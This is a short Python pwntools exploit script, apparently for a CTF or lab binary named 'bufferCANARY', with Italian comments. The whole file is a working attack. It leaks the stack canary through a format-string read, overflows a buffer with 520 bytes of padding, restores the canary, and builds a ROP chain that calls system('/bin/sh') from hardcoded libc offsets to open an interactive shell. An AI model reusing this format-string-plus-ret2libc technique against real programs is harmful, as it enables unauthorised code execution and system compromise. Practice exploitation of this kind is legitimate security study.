import sys
from pwn import *

p = process(b"./bufferCANARY")


m = p.recvuntil(b"username\n")
log.info(m)
p.sendline(b"%43$llx")
p.recvuntil(b":")
canary = int(p.recvline(), 16)

log.success(f'Canary:{hex(canary)}')

offset = b"\x41" * 520

libc_base =  0x00007ffff7dae000     # Ottenuto con      ldd buffer
system = libc_base + 0x50f10        # Ottenuto con      readelf -s  /usr/lib/libc.so.6 | grep "system"
bin_sh = libc_base + 0x1aae28       # Ottenuto con      strings -a -t x /usr/lib/libc.so.6| grep /bin/sh

# Gadget ottenuti con ROPgadget
pop_rdi = 0x40117a
ret = 0x40101a # Usato per allineare lo stack a 16 byte

payload = offset
payload += p64(canary)
payload += p64(0x0)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

p.recvuntil(b":")
p.sendline(payload)
p.interactive()
